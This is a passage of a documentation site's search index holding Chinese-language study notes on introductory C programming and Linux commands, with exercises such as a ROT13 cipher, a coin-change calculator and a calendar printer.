call\n\n    printf(\"count=%i  local=%i\\n\", count, local);\n    ++count;\n    ++local;\n}\n\n//  main IS NOT DECLARED AS static BECAUSE THE OPERATING SYSTEM MUST BE ABLE TO CALL IT\nint main(int argc, char *argv[])\n{\n    for(int i=0 ; i &lt; 5 ; ++i) {\n        myfunction();\n    }\n    exit(EXIT_SUCCESS);\n}\n</code></pre> <p>\u8fd9\u91cc\u7684 count \u4f5c\u4e3a\u9759\u6001\u5173\u952e\u5b57\uff0c\u6574\u4e2a\u751f\u547d\u5468\u671f\u53ea\u4f1a\u88ab\u5206\u914d\u4e00\u6b21\u5185\u5b58\uff0c\u65e0\u8bba\u51fd\u6570\u8c03\u7528\u591a\u5c11\u6b21\u8be5\u53d8\u91cf\u4e5f\u4e0d\u4f1a\u521d\u59cb\u5316\uff0c\u800c local \u4f1a\u5728\u6bcf\u6b21\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u91cd\u65b0\u88ab\u521d\u59cb\u5316\u6210 0 \u4f5c\u7528\u57df\u4e3a\u51fd\u6570\u5185\u90e8</p> <pre><code>count=1  local=0\ncount=2  local=0\ncount=3  local=0\ncount=4  local=0\ncount=5  local=0\n</code></pre>"},{"location":"cs/c/2.2/#functions-receiving-a-variable-number-of-arguments","title":"Functions receiving a variable number of arguments","text":"<p>\u8fd9\u91cc\u7b80\u8981\u4ecb\u7ecd\u4e86 <code>printf</code> \u8fd9\u6837\u7684\u53c2\u6570\uff0c\u591a\u4e2a\u53ef\u53d8\u53d8\u91cf\u80fd\u591f\u7ed1\u5b9a string \u4e2d\uff0c\u5c31\u5fc5\u987b\u63d0\u4f9b <code>%d %s %i</code> \u8fd9\u79cd\u53c2\u6570</p> <p>\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u7ed9\u7cfb\u7edf\u505a\u65e5\u5fd7\u8bb0\u5f55\u7684\u65f6\u5019\u751a\u81f3\u4e0d\u77e5\u9053\u53c2\u6570\u6570\u636e\u7c7b\u578b\u7684\u65f6\u5019\u5c31\u9700\u8981\u8c03\u7528\u7b2c\u4e09\u65b9\u5e93\u6bd4\u5982 <code>stdarg.h</code> \u53bb\u652f\u6301</p>"},{"location":"cs/c/2.2/#readings","title":"Readings","text":"<pre><code>#include &lt;stdio.h&gt;\n\n// This function takes no arguments and returns no value:\n\nvoid hello(void)\n{\n    printf(\"Hello, world!\\n\");\n}\n\nint main(void)\n{\n    hello();  // Prints \"Hello, world!\"\n}\n</code></pre> <p>function prototype \u662f\u5bf9\u51fd\u6570\u7684\u4e00\u79cd\u58f0\u660e\uff0c\u5b83\u5411\u7f16\u8bd1\u5668\u63d0\u4f9b\u4e86\u51fd\u6570\u7684\u540d\u79f0\u3001\u53c2\u6570\u7c7b\u578b\u4ee5\u53ca\u8fd4\u56de\u7c7b\u578b\uff0c\u4f46\u4e0d\u5305\u542b\u51fd\u6570\u7684\u5b9e\u9645\u5b9e\u73b0\uff08\u51fd\u6570\u4f53\uff09\u3002\u51fd\u6570\u539f\u578b\u901a\u5e38\u51fa\u73b0\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6216\u5934\u6587\u4ef6\u4e2d\uff0c\u7528\u4e8e\u5728\u51fd\u6570\u8c03\u7528\u4e4b\u524d\u544a\u8bc9\u7f16\u8bd1\u5668\u51fd\u6570\u7684\u57fa\u672c\u4fe1\u606f\u3002</p> <pre><code>void foo();\nvoid foo(void);  // Not the same!\n</code></pre> <p>\u4ee5\u4e0a\u4e24\u884c\u5b8c\u5168\u4e0d\u4e00\u6837\uff0c\u540e\u8005\u5411\u7f16\u8bd1\u5668\u8868\u660e\u6ca1\u6709\u53c2\u6570\u540e\u6709\u6548\u5173\u95ed\u4e86\u7c7b\u578b\u68c0\u67e5\uff0c\u56e0\u6b64\u63a8\u8350\u5728\u7a7a\u53c2\u6570\u65f6\u4f7f\u7528 void \u58f0\u660e\u3002</p>"},{"location":"cs/c/2.2/#increment-value-copy","title":"Increment &amp; Value Copy","text":"<pre><code>int a = 5;\nint b = a++;\n</code></pre> <p>a++ \u4e3a\u540e\u7f6e\u81ea\u589e\uff0creturn \u539f\u6570\u503c\u540e\u518d\u52a0 1\uff0c\u56e0\u6b64 a \u7ed3\u679c\u4e3a 6\uff0cb \u4e3a 5</p> <pre><code>int a = 5;\nint b = ++a;\n\n// b = 6, a =6\n</code></pre> <p>++a \u4e3a\u524d\u7f6e\u81ea\u589e\uff0c\u7ed9\u539f\u6570\u503c\u5148\u52a0\u4e0a 1 \u540e\u518d return \u8be5\u503c</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int a)\n{\n    a++;\n}\n\nint main(void)\n{\n    int i = 10;\n\n    increment(i);\n\n    printf(\"i == %d\\n\", i);  // 10\n}\n</code></pre> <p>Pass by value</p> <p>\u5728 C \u8bed\u8a00\u4e2d\uff0c\u5f53\u4f60\u5c06\u4e00\u4e2a\u53d8\u91cf\u4f20\u9012\u7ed9\u51fd\u6570\u65f6\uff0c\u51fd\u6570\u63a5\u6536\u7684\u662f\u8be5\u53d8\u91cf\u7684\u526f\u672c\uff0c\u800c\u4e0d\u662f\u8be5\u53d8\u91cf\u7684\u5f15\u7528\u3002\u8fd9\u610f\u5473\u7740\u5728\u51fd\u6570 increment \u4e2d\uff0ca \u662f i \u7684\u526f\u672c\uff0c\u5bf9 a \u7684\u4efb\u4f55\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd main \u51fd\u6570\u4e2d\u7684 i\u3002\u5e76\u4e14 void \u51fd\u6570\u672c\u8eab\u65e0\u6cd5 return \u4efb\u4f55\u503c\uff0c\u56e0\u6b64\u7b54\u6848\u4e3a 10\uff0c\u8981\u60f3\u5728 void \u51fd\u6570\u7684\u65f6\u5019\u52a0 1 \u5c31\u8981\u7528\u5230\u6307\u9488\u6982\u5ff5\uff1a</p> <p>Pass by reference</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int *a) {\n    (*a)++;\n}\n\nint main(void) {\n    int i = 10;\n\n    increment(&amp;i);  // \u4f20\u9012 i \u7684\u5730\u5740\n\n    printf(\"i == %d\\n\", i);  // \u73b0\u5728\u8f93\u51fa\u662f 11\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4fee\u6539\u540e\u7684\u4ee3\u7801\u4e2d\uff0cincrement \u51fd\u6570\u63a5\u6536 i \u7684\u5730\u5740\uff0c\u5e76\u76f4\u63a5\u5bf9 i \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64 i \u7684\u503c\u4f1a\u88ab\u771f\u6b63\u589e\u52a0\uff0c\u8f93\u51fa\u4f1a\u662f 11\u3002</p>"},{"location":"cs/c/2.3/","title":"2.3 Linux Review","text":""},{"location":"cs/c/2.3/#fri-workshop-1","title":"Fri Workshop 1","text":"<p>Ubuntu \u4ecd\u7136\u662f\u76ee\u524d\u5de5\u4e1a\u754c\u5b89\u5168\u8003\u8651\u8303\u56f4\u5185\u6700\u4f18\u7684\u7cfb\u7edf\uff0c\u63d0\u4f9b LTS \u7248\u672c</p> <pre><code>cal 08 2024\nexpr 90 \\* 2\n</code></pre> <p>\u5176\u4e2d man \u624b\u518c\u4e0d\u540c\u7684 Linux \u53d1\u884c\u5546\u90fd\u7f16\u5199\u4e86\u81ea\u5df1\u7684\u7248\u672c\uff0c\u81ea\u5df1\u6311\u9009\u4e00\u4e2a</p> <p>\u5e38\u89c1 Linux \u547d\u4ee4\u53ef\u4ee5\u5728 Dive into Systems \u8fd9\u672c\u4e66\u4e2d\u627e\u5230</p>"},{"location":"cs/c/2.3/#unix-philosophy","title":"Unix Philosophy","text":"<p>\u4e3a\u4e00\u4e2a\u95ee\u9898\u5199\u4e00\u4e2a\u6700\u597d\u7684\u5de5\u5177\u53bb\u89e3\u51b3\uff0c\u89e3\u51b3\u5176\u4ed6\u95ee\u9898\u7684\u5de5\u5177\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u5de5\u5177\u4f5c\u4e3a\u7ec4\u4ef6\u89e3\u51b3\u95ee\u9898\uff0c\u548c Apple \u7684\u5f00\u53d1\u54f2\u5b66\u7c7b\u4f3c\u3002</p>"},{"location":"cs/c/2.3/#compiler","title":"Compiler","text":"<p>gcc \u662f\u7531 GNU \u9879\u76ee\u5f00\u53d1\u548c\u7ef4\u62a4\u7684\u7f16\u8bd1\u5668\u96c6\u5408, cc \u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u5b83</p> <pre><code>cc -std=c11 -Wall -Werror -o myprogram source.c\n</code></pre> <p><code>-Wall</code> \u542f\u7528\u6240\u6709\u5e38\u89c1\u7684\u7f16\u8bd1\u8b66\u544a\uff0c<code>-Werror</code> \u5c06\u6240\u6709\u8b66\u544a\u89c6\u4e3a\u9519\u8bef</p> <p>\u8be5\u6307\u4ee4\u7528 c11 \u6807\u51c6\u548c\u8b66\u544a\u89c4\u8303\u4e25\u683c\u8fdb\u884c\u7f16\u8bd1\u64cd\u4f5c\uff0c\u7528\u4e8e\u7f16\u5199\u9ad8\u8d28\u91cf\u4ee3\u7801</p>"},{"location":"cs/c/2.3/#labsheet-1","title":"Labsheet 1","text":"<p>\u8be5\u8bfe\u7a0b\u4f1a\u6709\u4e24\u4e2a Projects \u5360\u6bd4 50%</p> <p>Linux \u9996\u9009\u7684\u7f16\u8bd1\u5668\u662f gcc \u800c macOS \u4e3a clang \u5176\u4e3a 2007 \u5e74\u82f9\u679c\u81ea\u4e3b\u7814\u53d1\u7684\u7f16\u8bd1\u5668\u4f5c\u4e3a LLVM \u9879\u76ee\u4e4b\u4e00</p> <p>\u4e24\u8005\u90fd\u53ef\u4ee5\u88ab cc \u76f4\u63a5\u8c03\u7528\uff0c\u53ef\u5728 Terminal \u4e2d\u76f4\u63a5\u6267\u884c</p>"},{"location":"cs/c/2.3/#alias","title":"Alias","text":"<p>Linux \u4e2d\u6709\u4e00\u79cd\u547d\u4ee4\u5feb\u6377\u952e\u7684\u7528\u6cd5\uff0c\u548c Windows \u4e0b\u7684\u73af\u5883\u53d8\u91cf\u7c7b\u4f3c</p> <pre><code>vim ~/.bash_profile\n</code></pre> <pre><code>alias c=\"clear\"\nalias ll=\"ls -l\"\n</code></pre> <pre><code>source ~/.bash_profile\n</code></pre> <p>\u7136\u540e\u5728\u4e0b\u6b21\u767b\u9646\u4f1a\u8bdd\u65f6\uff0c\u7cfb\u7edf\u5c31\u4f1a\u81ea\u52a8\u52a0\u8f7d\u522b\u540d\u673a\u5236\u7136\u540e\u751f\u6548</p>"},{"location":"cs/c/2.3/#rot3","title":"ROT3","text":"<p>\u7ef4\u62a4\u7ed3\u6784\u826f\u597d\u7684\u8ba1\u7b97\u673a\u5b66\u4e60\u76ee\u5f55\u5c42\u6b21\u7ed3\u6784\uff0c\u5212\u5206\u5de5\u4f5c\u903b\u8f91\u5206\u533a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u7f16\u8bd1\u671f\u95f4\u5982\u679c\u4e0d\u63d0\u4f9b <code>-o</code> \u53c2\u6570\u76f4\u63a5 <code>cc rotate.c</code>  \u4f1a\u591a\u51fa\u4e00\u4e2a a.out \u53ef\u6267\u884c\u6587\u4ef6\uff0c<code>a.out</code> \u4e3a\u9ed8\u8ba4\u540d</p> <p>\u4e3a\u4e86\u4e25\u683c\u7f16\u8bd1\u6240\u6709 C11 \u7a0b\u5e8f\uff0c\u6574\u4e2a Lab \u5c06\u91c7\u7528\u4ee5\u4e0b\u7f16\u8bd1\u53c2\u6570\u6267\u884c\uff1a</p> <pre><code>cc -std=c11 -Wall -Werror -o rotate rotate.c\n</code></pre> <p>\u7ed3\u5408 vim \u63d0\u4f9b\u7684 alias \u529f\u80fd\uff0c\u53ef\u901a\u8fc7\u7f16\u8f91 <code>~/.bash_profile</code> \u6dfb\u52a0\u4ee5\u4e0b\u884c\u7b80\u5316\u7f16\u8bd1\u6d41\u7a0b</p> <pre><code>alias mycc=\"cc -std=c11 -Wall -Werror\"\nsource ~/.bash_profile\n</code></pre> <p>\u65e5\u540e\u7684\u7f16\u8bd1\u6d41\u7a0b\u5c31\u76f4\u63a5\u80fd\u7b80\u5316\u6210\uff1a</p> <pre><code>mycc -o rotate rotate.c\n</code></pre>"},{"location":"cs/c/2.3/#linux-commands","title":"Linux Commands","text":"<p>\u9664\u53bb\u5e38\u89c1\u6eda\u74dc\u70c2\u719f\u7684\u6307\u4ee4\u6a21\u5f0f\uff1a</p> <pre><code>man -k vim\n# -k \u5217\u51fa\u6240\u6709 vim \u7b80\u8ff0\n\nls -lt \n# \u6309\u7167\u65f6\u95f4\u6392\u5e8f\n\nls -lR\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u5217\u4e3e\n\ncp -R olddir newdir\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u62f7\u8d1d\n\ndu -sh dirname\n# \u7528\u4eba\u6027\u5316\u683c\u5f0f\u663e\u793a\u8be5\u6587\u4ef6\u5939\u78c1\u76d8\u4f7f\u7528\u72b6\u51b5\n\ncat -s filename\n# \u53bb\u7a7a\u884c\u67e5\u770b\u6587\u4ef6\n\nhead -3 filename \nhead -c 100 filename\ntail -3 filename\ntail -c 100 filename\n# \u4ece\u6587\u4ef6\u5f00\u5934\u6216\u7ed3\u5c3e\u9605\u8bfb\u7279\u5b9a\u884c\u6216\u5b57\u6570\n\nwc -l filename\n# \u9ed8\u8ba4\u662f\u663e\u793a\u5b57\u6570\u3001\u5355\u8bcd\u6570\u548c\u884c\u6570\uff0c-l \u662f\u6587\u4ef6\u884c\u6570\n\ngrep pattern filename\ngrep -c pattern filename\n# \u663e\u793a\u5339\u914d\u8fd9\u79cd\u6a21\u5f0f\u7684\u6b21\u6570\ngrep -i pattern filename\n# \u5ffd\u7565\u6587\u4ef6\u5927\u5c0f\u5199\n\nps aux\n# \u6240\u6709\u8fdb\u7a0b\u548c\u5c5e\u6027\n</code></pre>"},{"location":"cs/c/2.3/#1-integer-arithmetic","title":"1. Integer Arithmetic","text":"<p>\u6fb3\u5927\u5229\u4e9a\u8d85\u5e02\u627e\u96f6\u5c0f\u7a0b\u5e8f\uff0c\u8f93\u5165\u5546\u54c1\u4ef7\u683c\u8f93\u51fa\u652f\u4ed8 100 \u5206\u540e\u5f97\u5230\u7684\u627e\u96f6\u4fe1\u606f\uff0c\u627e\u96f6\u786c\u5e01\u79cd\u7c7b\u6709 1c 2c 5c 10c 20c 50c</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int const argc, char *argv[]) {\n    // argc \u4ee3\u8868\u7684\u53c2\u6570\u6570\u91cf\uff0cargv \u50a8\u5b58\u6240\u6709\u53c2\u6570\n    // %dn means a integer with a line break\n    if (argc != 2) {\n        printf(\"Format Error, please use ./change cents.\\n\");\n        return 0;\n    }\n\n    int const price = atoi(argv[1]);\n\n    if (price &lt;= 0 || price &gt; 100) {\n        printf(\"Data Type Error, please use int and the price needs to &lt;= 100.\\n\");\n        return 0;\n    }\n\n    int change = 100 - price;\n    int const coin_50 = change / 50;\n    change = change % 50;\n    int const coin_20 = change / 20;\n    change = change % 20;\n    int const coin_10 = change / 10;\n    change = change % 10;\n    int const coin_5 = change / 5;\n    change = change % 5;\n    int const coin_2 = change / 2;\n    change = change % 2;\n    int const coin_1 = change / 1;\n    printf(\"%d 50c, %d 20c, %d 10c, %d 5c, %d 2c, %d 1c for changes.\\n\", coin_50, coin_20,\n    coin_10, coin_5, coin_2, coin_1);\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u662f\u8d2a\u5fc3\u7b97\u6cd5\u548c\u52a8\u6001\u89c4\u5212\u5e38\u8003\u7684\u9898\uff0c\u4f46\u662f\u5728\u4e0d\u7528\u7b97\u6cd5\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u624b\u52a8\u66f4\u65b0\u4f59\u989d\u5e76\u624b\u52a8\u964d\u5e8f\u53d6\u4f59\u6570\u6700\u7ec8\u6574\u4f53\u5c06\u7b54\u6848\u7b54\u5e94\u51fa\u6765\uff1b\u7a0b\u5e8f\u5728\u7f16\u5199\u8fc7\u7a0b\u4e2d\u7406\u89e3\u4e86 C \u7684\u4e00\u4e9b\u7ec6\u8282\uff1a</p> <ol> <li> <p><code>printf</code> \u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u6709\u7684\u62fc\u63a5\u90fd\u662f\u7528 % \u5f00\u5934\u7684\u66ff\u6362\u7b26\u62fc\u63a5\u4e0a\u53bb</p> </li> <li> <p>argc \u4e3a arg count \u4e5f\u5c31\u662f\u6570\u91cf\uff0c./main \u7b97 argv[0] \u56e0\u6b64\u7b97\u4e24\u4e2a</p> </li> <li> <p>argv \u4e3a char \u6570\u7ec4, char * \u4e3a\u6307\u9488\u6307\u5411\u5176\u4e2d\u7684\u4e00\u4e2a char</p> </li> <li> <p>In C, you cannot directly cast a string (which argv[1] is, as a char *) to an int because a string is a sequence of characters (a pointer) and not directly an integer value. </p> </li> </ol> <p>\u7531\u4e8e\u76f4\u63a5\u5185\u5b58\u7ba1\u7406\u548c\u5e95\u5c42\u7684\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u8bbe\u8ba1\uff0cC \u8bed\u8a00\u5e76\u4e0d\u652f\u6301\u50cf Python \u4e00\u6837\u76f4\u63a5\u8f6c\u6362\u6570\u636e\u7c7b\u578b\uff0c\u9700\u8981\u7528 atoi \u8fd9\u4e2a\u5305\u5c06 pointer \u627e\u5230\u540e\u6210\u529f\u8f6c\u6362\u3002<code>char str[] = \"Hello, World!\";</code> \u4e3a\u5b57\u7b26\u4e32\u6570\u636e\u7c7b\u578b\u58f0\u660e\u65b9\u5f0f\u3002 </p>"},{"location":"cs/c/2.3/#2-call-system-date-function","title":"2. Call system date function","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    printf(\"%d\",system(\"date\"));\n    return 0;\n}\n</code></pre> <p>\u8c03\u7528\u7cfb\u7edf\u4f9d\u7136\u82f1 <code>stdlib</code> \u5305\u4e2d\u7684 <code>system</code> \u51fd\u6570\uff0cdate \u7684\u8f93\u51fa\u6709\u610f\u601d\u7684\u662f\u6574\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u8f93\u51fa\u540e\u4f1a\u7b54\u5e94\u4e00\u4e2a 0, \u8fd9\u662f\u4ee3\u8868 the date command executed successfully with an exit status of 0.</p>"},{"location":"cs/c/2.3/#4-array","title":"4. Array","text":"<p>\u968f\u673a\u5927\u4e50\u900f\u6d17\u724c\u7a0b\u5e8f</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main() {\n    srand(time(NULL));\n    int result[6];\n    for (int i = 0; i &lt; 6; i++) {\n        int const ranNum = rand() % 100;\n        result[i] = ranNum;\n        printf(\"%d\\n\", result[i]);\n    }\n}\n</code></pre> <p>\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u6709\u771f\u968f\u673a\u6570\u548c\u4f2a\u968f\u673a\u6570\u7684\u6982\u5ff5\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6bcf\u6b21\u751f\u6210\u7684\u6570\u4e3a\u771f\u968f\u673a\uff0c\u5bfc\u5165 <code>time(NULL)</code> \u8fd4\u56de\u4e00\u4e2a time_t \u7c7b\u578b\u7684\u503c\uff0c\u8868\u793a\u5f53\u524d\u65f6\u95f4\u4e0e Unix \u7eaa\u5143 (1970\u5e741\u67081\u65e500:00:00 UTC) \u7684\u79d2\u5dee\u503c\uff0c\u6570\u636e\u7c7b\u578b\u4e3a long int \u6253\u5370\u7528 <code>%ld</code>\u3002\u8fd9\u6837\u6bcf\u4e00\u6b21\u83b7\u53d6\u968f\u673a\u6570\u7684\u65f6\u5019\uff0c\u751f\u6210\u79cd\u5b50\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c<code>%</code> \u80fd\u591f\u4fdd\u8bc1\u65e0\u8bba\u591a\u5927\u7684\u968f\u673a\u6570\u6700\u7ec8\u90fd\u80fd\u63a7\u5236\u5728 0 ~ 100 \u7684\u8303\u56f4\u4e4b\u5185\u3002</p>"},{"location":"cs/c/2.3/#tasks","title":"Tasks","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/2.3/#rot-13-rot-3","title":"ROT 13 -&gt; ROT 3","text":"<p>\u7b2c 9 \u884c\u7684 13 \u6539\u4e3a 3, 45 \u884c\u52a0\u4e2a\u6362\u884c\u7b26</p>"},{"location":"cs/c/2.3/#position","title":"POSITION","text":"<pre><code>printf(\"%c, %c\\n\", argvalue[1][i], rotate(argvalue[1][i]));\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 char \u7528\u7684\u89e3\u6790\u7b26\u53f7\u4e3a <code>%c</code> </p>"},{"location":"cs/c/2.3/#original-char","title":"ORIGINAL CHAR","text":"<pre><code>printf(\"%c, %c, %d\\n\", argvalue[1][i], rotate(argvalue[1][i]), i + 1);\n</code></pre>"},{"location":"cs/c/2.3/#deal-with-capital-char","title":"DEAL WITH CAPITAL CHAR","text":"<pre><code>char rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    return ('A' + (c - 'A' + ROT) % 26);\n}\n</code></pre>"},{"location":"cs/c/2.3/#explanation","title":"Explanation","text":"<pre><code>#include &lt;stdio.h&gt;\n</code></pre> <p>\u4e3b\u8981\u5728\u4ee3\u7801\u4e2d\u652f\u6301 <code>fprintf</code> <code>printf</code> \u4e24\u4e2a\u51fd\u6570\uff0cfprintf \u80fd\u591f\u5b9a\u4e49\u6307\u5b9a\u7684\u8f93\u51fa\u6d41\uff0c\u5728\u5185\u5b58\u4e2d\u6253\u5370\uff0c\u53ef\u4ee5\u5728 buffer \u7f51\u7edc\u4e2d\u64cd\u4f5c\u7b49\u7b49</p> <pre><code>int fprintf(FILE *stream, const char *format, ...);\n</code></pre> <pre><code>fprintf(stderr, \"An error occurred: %s\\n\", \"File not found\");\n</code></pre> <p>\u4ee3\u7801\u4e2d\u5b9a\u4e49\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u4e3a\u6b64\u63d0\u793a</p> <p>\u6807\u51c6\u6d41\uff1a</p> <ul> <li>stderr\uff1a\u6807\u51c6\u9519\u8bef\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3002</li> <li>stdout\uff1a\u6807\u51c6\u8f93\u51fa\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u6b63\u5e38\u8f93\u51fa\u3002</li> <li>stdin\uff1a\u6807\u51c6\u8f93\u5165\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u8f93\u5165\u3002</li> </ul> <ul> <li>scanf\uff1a\u7528\u4e8e\u4ece\u6807\u51c6\u8f93\u5165\u6d41\u8bfb\u53d6\u683c\u5f0f\u5316\u8f93\u5165\u3002</li> </ul> <ul> <li>fopen\uff1a\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u4ee5\u8fdb\u884c\u8bfb\u53d6\u6216\u5199\u5165\u3002</li> </ul> <ul> <li>fclose\uff1a\u7528\u4e8e\u5173\u95ed\u4e00\u4e2a\u6253\u5f00\u7684\u6587\u4ef6\u3002</li> </ul> <ul> <li>fgets\uff1a\u7528\u4e8e\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u53d6\u4e00\u884c\u6587\u672c\u3002</li> </ul> <pre><code>#include &lt;stdlib.h&gt;\n\n// \u7528\u4e8e\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\nexit(EXIT_SUCCESS);\nexit(EXIT_FAILURE);\n</code></pre> <p>\u662f C \u8bed\u8a00\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u7528\u4e8e\u7ec8\u6b62\u5f53\u524d\u7a0b\u5e8f\u5e76\u8fd4\u56de\u4e00\u4e2a\u72b6\u6001\u7801\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002</p> <pre><code>#include &lt;string.h&gt;\n\n// strlen() \u51fd\u6570\u8c03\u7528\u8ba1\u7b97 char \u5b57\u7b26\u957f\u5ea6\n</code></pre> <pre><code>#include &lt;ctype.h&gt;\n\n// islower() \n</code></pre> <p>ctype \u4e3b\u8981\u7528\u4e8e\u5904\u7406\u5b57\u7b26\u7684\u5206\u7c7b\u548c\u8f6c\u6362\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\uff0c\u7528\u4e8e\u68c0\u67e5\u5b57\u7b26\u7684\u7c7b\u578b\uff08\u5982\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u767d\u5b57\u7b26\u7b49\uff09\u4ee5\u53ca\u5c06\u5b57\u7b26\u8fdb\u884c\u5927\u5c0f\u5199\u8f6c\u6362\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"cs/c/2.4/","title":"2.4 MyCal","text":""},{"location":"cs/c/2.4/#fri-workshop-2","title":"Fri Workshop 2","text":"<p>\u4e3b\u8981\u65e8\u5728\u521b\u5efa\u4e00\u4e2a cal \u4e00\u6837\u7684 c \u7f16\u5199\u7684\u65e5\u5386\u7a0b\u5e8f\uff0c\u7528 double for loop \u6253\u5370 4 \u6708\u6216 8 \u6708\u7684\u65e5\u5386\uff0c\u4ece\u76f4\u63a5\u8c03\u7528\u7cfb\u7edf\u7684 cal \u5230\u81ea\u5df1\u7f16\u5199\uff0c\u719f\u6089\u4e4b\u524d\u8bfe\u7a0b\u7684\u77e5\u8bc6\u70b9\u3002</p> <p>\u8be5\u7a0b\u5e8f\u7684\u6838\u5fc3\u7b97\u6cd5\u4e00\u5171\u6709\u4e24\u4e2a\uff1a</p> <ol> <li> <p>\u4e8c\u7ef4\u77e9\u9635\u7684\u5c4f\u5e55\u663e\u793a</p> </li> <li> <p>\u5982\u4f55\u7cbe\u786e\u663e\u793a\u65e5\u671f\u5c5e\u4e8e\u661f\u671f\u51e0</p> </li> </ol> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u4e8c\u7ef4\u77e9\u9635\u53ef\u4ee5\u7528\u5d4c\u5957 for loop \u89e3\u51b3\uff0c\u800c\u7b2c\u4e00\u884c\u7684\u5185\u5bb9\u53ef\u6839\u636e\u53c2\u6570\u7684\u8f93\u5165\u5355\u72ec\u5904\u7406\uff0c\u7b2c\u4e8c\u884c\u53ef\u5355\u72ec\u6253\u5370\uff0csolution 